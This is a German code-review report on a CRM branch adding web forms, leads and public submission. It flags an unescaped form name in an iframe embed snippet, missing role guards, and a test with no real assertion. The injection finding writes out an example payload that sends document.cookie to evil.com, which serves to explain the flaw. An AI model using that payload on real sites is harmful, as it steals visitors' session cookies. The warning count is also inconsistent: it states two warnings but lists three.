# Session 8 — Light Review (Tier 2)

**Branch:** feature/session-8-leads
**Reviewer:** @reviewer (Tier 2)
**Datum:** 2026-05-21
**Status:** CLEAN (2 WARNING, 2 INFO — kein BLOCKER)

---

## Zusammenfassung

Session 8 implementiert M2 Leads & Webformulare vollständig: FormsModule (CRUD + DOMPurify-sanitisiertes `schemaJson` + Embed-Snippet), LeadsModule (CRUD + Convert + ReEnqueue + Soft-Delete), PublicModule (rate-limitierter Public-Submit) und das `useLeadsSocket`-Hook (WS-Cache-Invalidierung via `lead:enriched`). Solide Basis, Tests vorhanden, DOMPurify korrekt integriert. Zwei Warnungen zu Autorisierung und Test-Qualität, zwei infos zu undokumentierten Variablen und Fehlerbehandlung.

---

## Befunde

### Security

#### WARNING — HTML-Attribut-Injection im Embed-Snippet
**Datei:** `apps/api/src/modules/forms/forms.service.ts:98`

```typescript
snippet: `<iframe src="${embedUrl}" ... title="${form.name}"></iframe>`,
```

`form.name` wird unescaped in ein HTML-Attribut interpoliert. Ein ADMIN mit Name `x" onload="fetch('https://evil.com/?c='+document.cookie)` erzeugt ein Snippet, das auf externen Websites (auf denen das Formular eingebettet wird) JS ausführt. Im CRM selbst ist das Snippet sicher (`<pre>`-Tag, React-encoded). Exploit erfordert ADMIN/MANAGER-Rechte + Social Engineering (zweiter Admin kopiert das Snippet auf eine externe Seite).

**Empfehlung:** `form.name` vor der Interpolation HTML-Attribut-escapen:
```typescript
const safeName = form.name.replace(/"/g, '&quot;').replace(/</g, '&lt;');
snippet: `<iframe ... title="${safeName}"></iframe>`,
```

---

#### WARNING — Keine Rollen-Guards auf mutierenden LeadsController-Endpunkten
**Datei:** `apps/api/src/modules/leads/leads.controller.ts:31-45`

`convert`, `reEnqueue` und `delete` haben kein `@Roles()`-Decorator. Jeder authentifizierte User (auch MEMBER) kann Leads soft-löschen, in Deals konvertieren und Enrichment-Jobs einreihen. `FormsController` schützt die gleichen Operationen korrekt mit `@Roles('ADMIN', 'MANAGER')`.

**Empfehlung:** Mutationen auf ADMIN/MANAGER einschränken:
```typescript
@Roles('ADMIN', 'MANAGER')
@Post(':id/convert')
// ...

@Roles('ADMIN', 'MANAGER')
@Post(':id/enrich')
// ...

@Roles('ADMIN', 'MANAGER')
@Delete(':id')
```

---

### Tests

#### WARNING — XSS-Sanitisierungs-Test prüft kein Ergebnis
**Datei:** `apps/api/src/modules/leads/leads.service.spec.ts:154-175`

Der Test "sanitizes XSS payload in submitted data" ruft `submitPublic` mit einem `<script>`-Payload auf, assertiert aber nur `expect(txCall).toBeDefined()` — nicht, ob der Payload tatsächlich sanitisiert wurde. Der Test würde bestehen, selbst wenn `sanitizeRecord` komplett entfernt würde.

**Empfehlung:** Das tatsächlich an `tx.lead.create` übergebene `dataJson` assertieren:
```typescript
const createCall = fakeTx.lead.create.mock.calls[0]?.[0];
expect(createCall?.data?.dataJson?.firstName).not.toContain('<script>');
expect(createCall?.data?.dataJson?.firstName).toBe('');
```

---

### Error-Handling / Sonstiges

#### INFO — `NEXT_PUBLIC_WEB_URL` undokumentiert und missbenannt
**Datei:** `apps/api/src/modules/forms/forms.service.ts:92`

```typescript
const webUrl = process.env.NEXT_PUBLIC_WEB_URL ?? 'http://localhost:3000';
```

Nicht in der Env-Variablen-Tabelle in CLAUDE.md aufgeführt. Das `NEXT_PUBLIC_`-Prefix ist NestJS-unüblich (Next.js-Konvention für Browser-Bundle). Fallback auf `localhost:3000` erzeugt falsche Embed-URLs in Staging/Prod-Deployments.

**Empfehlung:** Variable als `WEB_URL` (o.ä.) benennen und in CLAUDE.md dokumentieren.

---

#### INFO — `submitPublicForm` verliert API-Fehlerbeschreibung
**Datei:** `apps/web/lib/leads-api.ts:198`

```typescript
if (!res.ok) throw new Error(`Submit failed: ${res.status}`);
```

Fehlerbody (z.B. Rate-Limit-Nachricht oder Validation-Error) wird verworfen. Debugging in Production ist blind.

**Empfehlung:** Fehlerbody parsen und in die Exception einbetten (analog zu `apiFetch` im Rest der Codebase).

---

#### INFO (bekannt) — CORS Preflight für Public-Submit fehlt
**Datei:** `apps/api/src/modules/public/public.controller.ts`

`@Header('Access-Control-Allow-Origin', '*')` ist nur am POST-Handler — kein OPTIONS-Handler für Browser-Preflight. Bereits dokumentiert als Tech-Debt #28 in CLAUDE.md. Kein Action-Item für diese Session.

---

## Ergebnis

| Kategorie | Status |
|-----------|--------|
| Bugs | ✅ Keine offensichtlichen Bugs |
| Error-Handling | ⚠️ 1 INFO (submitPublicForm) |
| Security | ⚠️ 2 WARNING (Attribut-Injection, fehlende Rollen-Guards) |
| Tests | ⚠️ 1 WARNING (XSS-Test ohne Assert) |
| DSGVO | ✅ Soft-Delete überall vorhanden, `deletedAt: null` in allen Queries |

**BLOCKER gesamt:** 0
**WARNING gesamt:** 2
**INFO gesamt:** 2

**Empfehlung:** Kein BLOCKER — PR kann gemergt werden. Die 2 Warnungen (Attribut-Escape + Rollen-Guards) sollten zeitnah nachgezogen werden; Attribute-Injection ist ein echter Security-Befund für third-party Embed-Nutzer. Eintragen als Tech-Debt in CLAUDE.md und in einer Folge-Session fixen.
